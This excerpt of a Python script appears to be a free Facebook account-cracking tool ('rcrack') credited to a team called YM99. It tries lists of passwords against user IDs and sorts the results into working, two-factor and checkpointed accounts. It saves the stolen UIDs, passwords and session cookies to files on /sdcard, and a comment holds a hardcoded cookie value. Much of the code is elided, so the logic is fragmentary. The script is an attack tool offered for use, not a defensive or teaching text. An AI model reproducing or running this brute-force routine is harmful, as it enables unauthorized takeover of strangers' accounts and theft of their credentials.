#ASSALAMUALAIKUM
#TOOL OWNER SYED YAMIN  ISLAM#
#FACEBOOK : SYED YAMIN  ISLAM
...
#---------------END--------------#
logo=("""  \33[1;91m      
 ____  ____     _       ____    ____  _____  ____  _____   
|_  _||_  _|   / \     |_   \  /   _||_   _||_   \|_   _|  
  \ \  / /    / _ \      |   \/   |    | |    |   \ | |    
   \ \/ /    / ___ \     | |\  /| |    | |    | |\ \| |    
   _|  |_  _/ /   \ \_  _| |_\/_| |_  _| |_  _| |_\   |_   
  |______||____| |____||_____||_____||_____||_____|\____|                                                             
\033[1;31m[\033[1;32m+\033[1;31m]\033[1;93m═════════════════════════════════════════════════\033[1;31m[\033[1;32m+\033[1;31m]
     \033[1;31m[\033[1;32m•\033[1;31m]\33[1;32m CREATED BY\33[32;m   : MdYAMIN  Hossain  \033[1;96m 
     \033[1;31m[\033[1;32m•\033[1;31m]\33[1;32m FACEBOK      : YAMIN  Hossan \033[1;34m
     \033[1;31m[\033[1;32m•\033[1;31m]\33[1;32m TOOL STATUS  : FREE\033[1;36m    
     \033[1;31m[\033[1;32m•\033[1;31m]\33[1;32m TEAM         : YM99 \033[1;35m                  
...
def rcrack(uid,pwx,tl):
    ...
    try:
        for ps in pwx:
            ...
            sys.stdout.write(f'\r\x1b[38;5;155m[➤] YAMIN 👉YM99  \x1b[38;5;155m[{loop}]  \x1b[38;5;155mOK :- {GREEN}{len(oks)} ')
            sys.stdout.flush()
   		 ...
   		 # 'cookie': 'datr=9nzXZebidcII1tnlv1WQlSBJ; sb=9nzXZXi_bDgT17qy1ziAh7K1; m_pixel_ratio=1.655194878578186; wd=435x821; fr=0oB5SqwTKEWictPTF..Bl13z2.SC.AAA.0.0.Bl13z5.AWWoVNDGekI',
            ...
            if 'c_user' in log_cookies:
                ...
                uid = "1000"+coki1[0:11]
                print('')
                print(f"\x1b[1;92m[➤] YAMIN  OK 😹 {uid} \x1b[1;94m•\x1b[1;32m {ps} \n\033[1;32m[COOKIE]➤ \033[1;91m {coki} \n  ")
                open('/sdcard/YAMIN -𝙰𝙲𝚃𝙸𝚅𝙴😱😱.txt', 'a').write(uid+' • '+ps+' • ''[COOKIE]'  +coki+' \n')
                oks.append(uid)
                break
                ...
                if 'Enter login code to continue' in log_cookies:
                    ...
                    print('\r\033[38;5;45m[YAMIN -2𝙵] '+uid+' [😘] '+ps+' ')
                    open('/sdcard/YAMIN -2𝙵🥰.txt', 'a').write(uid+' | '+ps+'\n')
                    twf.append(uid)
                else:
                    coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                    coki1 = coki.split("1000")[1]
                    uid = "1000"+coki1[0:11]                    
                    print(f'\r\033[1;30m[YAMIN  CP🙄] '+uid+' [😭] '+ps+' ')                    
                    open('/sdcard/YAMIN -𝐂𝐏😒😒.txt', 'a').write(uid+' | '+ps+'\n')
                    cps.append(uid)
                break
            else:
                continue
